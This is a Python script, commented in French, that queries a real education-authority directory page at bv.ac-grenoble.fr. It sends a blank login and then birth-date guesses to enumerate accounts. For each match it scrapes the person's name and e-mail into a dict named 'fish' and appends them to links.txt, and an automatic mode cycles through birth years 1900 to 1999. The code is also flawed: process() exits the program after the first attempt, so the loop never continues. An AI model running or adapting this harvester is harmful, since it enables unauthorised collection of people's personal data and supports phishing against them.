import requests
import urllib.parse
from termcolor import cprint
from bs4 import BeautifulSoup as bs
import sys

def _input(userMessage = "") -> bool:
    """
    Fonction qui récupère le choix d'un utilisateur sans la touche 'Entrée'
    Tant que le choix n'est pas conforme le process continue
    :type userMessage: str
    :param userMessage: (Optionel) Afficher un message avant la saisie utilisateur
    :rtype: bool
    :return Vrais si 'y' ou 'Y' et Faux si 'n' ou 'N'
    """

    # Si message à afficher, on affiche le message
    if len(userMessage):
        print(userMessage)

    # Si msvcrt est indisponible on redéfinnit la méthode getch
    try:
        from msvcrt import getch
    except ImportError:
        def getch():
            import sys, tty, termios
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(sys.stdin.fileno())
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch

    print("Press Y or N to continue")

    # Dés que la touche saisie est conforme, on retourne la valeur bool du choix (yes = true, no = false)
    while True:
        char = getch()
        if char.lower() in ("y", "n"):
            return {"y": True, "n": False}[char.lower()]
            break


def process():
    params = {'daten1': daten1, 'daten2': daten2, 'daten3': daten3}
    params = urllib.parse.urlencode(params)
    r = requests.post('https://bv.ac-grenoble.fr/searchannu/src/infos_perso/etape2.php?login=%20')
    r = requests.get('https://bv.ac-grenoble.fr/searchannu/src/infos_perso/infos_perso.php?', params)
    txt = r.text
    soup = bs(txt, 'html.parser')
    fish = {
        'name': soup.findAll('td')[1].get_text(),
        'mail': soup.findAll('a')[0].get_text(),
    }
    print(fish)

    a = "Informations" in txt
    if a:
        file = open("links.txt", "a")
        file.write(fish['name'] + " : " + fish['mail'])
        file.write('\n')
        file.close()
        resultText = daten1,daten2,daten3,': Utilisateur trouvé.'
        cprint(resultText, 'green', 'on_grey')
    else:
        resultText = daten1,daten2,daten3,': Aucun utilisateur avec cette date.'
        cprint(resultText, 'red', 'on_grey')
    sys.exit()

def withInput():
    global daten1
    global daten2
    global daten3
    daten1 = int(input("Day: "))
    daten2 = int(input("Month: "))
    daten3 = int(input("Year: "))
    
def automatic():
    global daten1
    global daten2
    global daten3
    daten1 = 1
    daten2 = 1
    daten3 = 1900
    while daten3 < 2000:
        process()
        daten3 += 1

def getID():

    choice = _input("Mode pilote automatique ?")
    if choice:
        automatic()
    else:
        withInput()
        process()
    

if __name__ == '__main__':
    getID()
